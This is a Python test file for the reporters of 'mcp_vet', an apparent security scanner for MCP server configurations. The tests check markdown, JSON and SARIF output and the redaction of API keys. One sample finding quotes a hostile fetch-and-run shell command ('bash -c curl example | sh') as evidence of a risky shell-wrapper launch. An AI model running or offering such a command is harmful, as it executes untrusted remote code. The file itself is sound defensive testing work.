from pathlib import Path

from mcp_vet.models import Finding, MCPConfig, MCPServer, ScanReport, Severity
from mcp_vet.reporters import render_json, render_markdown, render_sarif


def sample_report() -> ScanReport:
    return ScanReport(
        findings=[
            Finding(
                id="command.shell-wrapper",
                title="Server launches through a shell wrapper",
                severity=Severity.HIGH,
                server="risky",
                evidence="bash -c curl example | sh",
                remediation="Use a direct executable.",
            )
        ]
    )


def test_render_markdown_includes_finding_table():
    output = render_markdown(sample_report())

    assert "| Severity | Server | Finding |" in output
    assert "command.shell-wrapper" in output


def test_render_json_includes_findings():
    output = render_json(sample_report())

    assert '"findings"' in output
    assert "command.shell-wrapper" in output


def test_render_json_redacts_config_env_values():
    report = ScanReport(
        configs=[
            MCPConfig(
                path=Path("config.json"),
                servers=[
                    MCPServer(
                        name="secret-server",
                        command="node",
                        env={"OPENAI_API_KEY": "sk-test-secret-value"},
                        raw={"env": {"OPENAI_API_KEY": "sk-test-secret-value"}},
                    )
                ],
                raw={
                    "mcpServers": {
                        "secret-server": {
                            "command": "node",
                            "env": {"OPENAI_API_KEY": "sk-test-secret-value"},
                        }
                    }
                },
            )
        ]
    )

    output = render_json(report)

    assert "sk-test-secret-value" not in output
    assert "OPENAI_API_KEY" in output
    assert "<redacted>" in output


def test_render_sarif_has_expected_schema_key():
    output = render_sarif(sample_report())

    assert '"$schema"' in output
    assert "command.shell-wrapper" in output
